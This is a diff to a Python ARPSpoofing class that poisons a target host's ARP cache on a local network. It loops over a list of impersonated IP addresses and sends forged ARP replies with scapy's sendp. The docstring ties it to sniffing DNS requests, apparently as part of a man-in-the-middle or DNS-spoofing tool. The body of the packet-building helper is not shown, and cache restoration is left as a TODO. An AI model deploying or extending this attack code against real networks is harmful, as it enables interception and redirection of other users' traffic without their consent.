@@ -7,23 +7,21 @@ import threading
 
 class ARPSpoofing(threading.Thread):
 
-    def __init__(self, interface: str, victims: list, target_mac: str, target_ip: str, spoofed_ip: str, delay: int):
+    def __init__(self, interface: str, target_mac: str, target_ip: str, spoofed_ips: list, delay: int):
         """
         Starts ARP spoofing in a background thread
 
             :param interface: interface on which DNS requests will be sniffed
-            :param victims: list of the hosts to be spoofed, empty list means all hosts will be spoofed
-            :param target_mac: mac of the host that will be spoofed
-            :param target_ip: ip of the host that will be spoofed
-            :param spoofed_ip: ip address that will be set as source of the spoofed MAC answers that will be sent
+            :param target_mac: mac of the host that will be poisoned
+            :param target_ip: ip of the host that will be poisoned
+            :param spoofed_ips: ip addresses for which false ARP cache entries will be created
             :param delay: delay between outgoing spoofed arp replies
         """
         super(ARPSpoofing, self).__init__()
         self.interface = interface
-        self.victims = victims
         self.target_mac = target_mac
         self.target_ip = target_ip
-        self.spoofed_ip = spoofed_ip
+        self.spoofed_ips = spoofed_ips
         self.delay = delay
         self._stop = threading.Event()
 
@@ -58,13 +56,18 @@ class ARPSpoofing(threading.Thread):
 
                 return spoofed_resp
 
-            spoofed_ans = create_spoofed_arp_answer()
-            sendp(spoofed_ans, iface=self.interface)
+            for ip in self.spoofed_ips:
+                spoofed_ans = create_spoofed_arp_answer(ip, self.target_ip, self.target_mac)
+                sendp(spoofed_ans, iface=self.interface)
 
         print("Now ARP spoofing...")
         while True:
             if self.is_stopped():
                 print("Stopped ARP spoofing")
+                print("Now restoring ARP cache of victim")
+                # TODO:
+                # for ip in self.spoofed_ips:
+                    # create_correct_arp_packet_and_send_it_to_target
                 return
             arp_spoof()
             time.sleep(self.delay)
